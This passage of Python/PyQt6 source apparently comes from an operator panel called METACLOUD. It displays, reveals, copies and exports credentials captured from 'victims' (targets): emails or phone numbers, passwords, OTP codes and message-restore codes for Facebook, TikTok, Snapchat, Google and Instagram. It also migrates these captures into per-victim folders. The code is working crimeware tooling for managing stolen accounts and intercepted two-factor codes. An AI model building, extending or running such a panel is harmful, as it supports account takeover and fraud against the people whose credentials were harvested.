        rl.setContentsMargins(12, 8, 12, 8)
        rl.setSpacing(14)

        lbl = QLabel(label)
        lbl.setStyleSheet(f"color: {color}; font-weight: bold; font-size: 11px; background: transparent; border: none; min-width: 110px;")
        rl.addWidget(lbl)

        # When hide_credentials is enabled, mask the value with dots until revealed
        hide_active = is_hide_credentials()
        display_value = "●" * min(len(str(value)), 24) if hide_active and value else value

        val = QLabel(display_value)
        val.setStyleSheet(f"color: {_t['text']}; font-size: 13px; font-family: 'Consolas','Monaco',monospace; background: transparent; border: none;")
        val.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        val.setCursor(Qt.CursorShape.IBeamCursor)
        rl.addWidget(val, stretch=1)

        # Reveal button — only shown when hide_credentials is enabled
        if hide_active:
            btn_reveal = BounceButton("👁️ Voir")
            btn_reveal.setMinimumWidth(80)
            btn_reveal.setFixedHeight(30)
            btn_reveal.setToolTip("Afficher / masquer la valeur")
            btn_reveal.setStyleSheet("""
                QPushButton {
                    background-color: #6b7280; color: white; border: none;
                    border-radius: 6px; font-weight: normal;
                    padding: 4px 12px;
                }
                QPushButton:hover { background-color: #f59e0b; }
                QPushButton:pressed { background-color: #d97706; }
            """)
            # Toggle the displayed value between the masked dots and the real value
            def _toggle_reveal(checked, lbl=val, real_value=value, btn=btn_reveal):
                try:
                    if lbl.text().startswith("●"):
                        lbl.setText(real_value)
                        btn.setText("🙈 Masquer")
                    else:
                        lbl.setText("●" * min(len(str(real_value)), 24))
                        btn.setText("👁️ Voir")
                except Exception as e:
                    log_error_to_file("CredentialsWindow._toggle_reveal", e)
            btn_reveal.clicked.connect(_toggle_reveal)
            rl.addWidget(btn_reveal)

        # Copy button — wider and with margins so it has breathing room
        btn_copy = BounceButton("📋 Copier")
        btn_copy.setMinimumWidth(90)
        btn_copy.setFixedHeight(30)
        btn_copy.setToolTip("Copier dans le presse-papier")
        btn_copy.setStyleSheet("""
            QPushButton {
                background-color: #334155; color: white; border: none;
                border-radius: 6px; font-weight: normal;
                padding: 4px 14px;
            }
            QPushButton:hover { background-color: #3b82f6; }
            QPushButton:pressed { background-color: #2563eb; }
        """)
        btn_copy.clicked.connect(lambda checked, v=value: self._copy_to_clipboard(v))
        rl.addWidget(btn_copy)

        return row

    def _copy_to_clipboard(self, text):
        try:
            QApplication.clipboard().setText(text)
        except Exception as e:
            log_error_to_file("CredentialsWindow._copy_to_clipboard", e)
            log_error("CredentialsWindow._copy_to_clipboard", e)

    def _export_txt(self):
        """Export the filtered credentials to a text file."""
        try:
            if not self.filtered_blocks:
                QMessageBox.information(self, "Export", "Aucun identifiant à exporter.")
                return
            default_name = f"credentials_{self.tid}.txt" if self.tid else "credentials_export.txt"
            from PyQt6.QtWidgets import QFileDialog
            file_path, _ = QFileDialog.getSaveFileName(self, "Exporter les identifiants", default_name, "Text files (*.txt)")
            if not file_path:
                return
            with open(file_path, "w", encoding="utf-8") as f:
                f.write("╔══════════════════════════════════════════════════╗\n")
                f.write("║       METACLOUD - CREDENTIALS EXPORT             ║\n")
                f.write("╚══════════════════════════════════════════════════╝\n\n")
                for b in self.filtered_blocks:
                    _pid = (b.get("platform") or "facebook").lower().strip()
                    _pid_meta = {"facebook": "📘 Facebook", "tiktok": "🎵 TikTok", "snapchat": "👻 Snapchat", "google": "🔍 Google", "instagram": "📷 Instagram"}
                    _pid_label = _pid_meta.get(_pid, "📘 Facebook")
                    f.write("┌──────────────────────────────────────────────────\n")
                    f.write(f"│  🎯 Cible     : {mask_name(b.get('target',''))}\n")
                    f.write(f"│  🌐 Plateforme: {_pid_label}\n")
                    f.write(f"│  🕐 Date      : {b.get('date','')}\n")
                    f.write(f"│  📧 Email/Numéro: {b.get('email','')}\n")
                    f.write(f"│  🔑 Password  : {b.get('password','')}\n")
                    for i, otp in enumerate(b.get("otps", []), 1):
                        # Handle both dict and string formats
                        if isinstance(otp, dict):
                            label = otp.get("label", f"OTP {i}")
                            value = otp.get("value", "")
                        else:
                            label = f"OTP {i}"
                            value = str(otp)
                        f.write(f"│  🔢 {label:<9} : {value}\n")
                    # Message restore codes — only exported if captured
                    msg_restore_entries = b.get("message_restore", [])
                    if msg_restore_entries:
                        for i, mr in enumerate(msg_restore_entries, 1):
                            if isinstance(mr, dict):
                                mr_label = mr.get("label", f"MSG RESTORE {i}")
                                mr_value = mr.get("value", "")
                            else:
                                mr_label = f"MSG RESTORE {i}"
                                mr_value = str(mr)
                            f.write(f"│  💬 {mr_label:<9}: {mr_value}\n")
                    f.write("└──────────────────────────────────────────────────\n\n")
            QMessageBox.information(self, "Export réussi", f"{len(self.filtered_blocks)} capture(s) exportée(s) vers :\n{file_path}")
        except Exception as e:
            log_error_to_file("CredentialsWindow._export_txt", e)
            log_error("CredentialsWindow._export_txt", e)
            QMessageBox.critical(self, "Erreur", f"Erreur lors de l'export : {e}")

    def _migrate_from_txt(self):
        """Lance la migration des identifiants du fichier credentials.txt legacy
        vers le dossier de chaque victime. Idempotent par cible."""
        try:
            import credentials_manager as cm
            import os as _os

            # Vérifier que le fichier credentials.txt existe
            if not _os.path.exists("credentials.txt"):
                QMessageBox.information(self, "Migration",
                    "Aucun fichier credentials.txt trouvé.\n"
                    "La migration n'est pas nécessaire.")
                return

            # Demander confirmation
            reply = QMessageBox.question(self, "Migration des identifiants",
                "Cette action va parser le fichier credentials.txt et créer\n"
                "un fichier JSON par bloc de capture, rangé dans le dossier\n"
                "credentials/ de chaque victime correspondante.\n\n"
                "• Les cibles déjà migrées sont ignorées (idempotent).\n"
                "• Les sessions existantes ne sont PAS écrasées.\n\n"
                "Voulez-vous continuer ?",
                QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                QMessageBox.StandardButton.Yes)
            if reply != QMessageBox.StandardButton.Yes:
                return

            # Exécuter la migration
            result = cm.migrate_from_txt(force=False)

            migrated = result.get("migrated", 0)
            skipped = result.get("skipped", 0)
            errors = result.get("errors", [])

            # Construire le message de résultat
            msg_parts = []
            msg_parts.append(f"<b>✅ Sessions créées :</b> {migrated}")
            if skipped:
                msg_parts.append(f"<b>⏭️ Sessions ignorées (déjà migrées) :</b> {skipped}")
            if errors:
                msg_parts.append(f"<b>⚠️ Erreurs :</b> {len(errors)}")
                for err in errors[:5]:
                    msg_parts.append(f"   • {err}")
                if len(errors) > 5:
                    msg_parts.append(f"   • ... et {len(errors) - 5} autre(s)")

            if migrated == 0 and not errors:
                QMessageBox.information(self, "Migration",
                    "Aucune nouvelle session à migrer.\n"
                    "Toutes les captures sont déjà dans les dossiers des victimes.")
            elif migrated > 0:
                QMessageBox.information(self, "Migration terminée",
                    "<br>".join(msg_parts))
                # Recharger les sessions
                self.refresh()
            else:
                QMessageBox.warning(self, "Migration — erreurs",
                    "<br>".join(msg_parts))

        except Exception as e:
            log_error_to_file("CredentialsWindow._migrate_from_txt", e)
            log_error("CredentialsWindow._migrate_from_txt", e)
            QMessageBox.critical(self, "Erreur", f"Erreur lors de la migration :\n{e}")

    def center(self):
        qr = self.frameGeometry()
        cp = self.screen().availableGeometry().center()
        qr.moveCenter(cp)
        self.move(qr.topLeft())

    def showEvent(self, event):
        self.center()
        self.refresh()
        self.animation = QPropertyAnimation(self, b"windowOpacity")
        self.animation.setDuration(400)
        self.animation.setStartValue(0.0)
        self.animation.setEndValue(1.0)
        self.animation.setEasingCurve(QEasingCurve.Type.InOutQuad)
        self.animation.start()
        super().showEvent(event)

    def closeEvent(self, event):
        self.hide()
        event.ignore()


# ═══════════════ Corbeille (Trash) Window ═══════════════
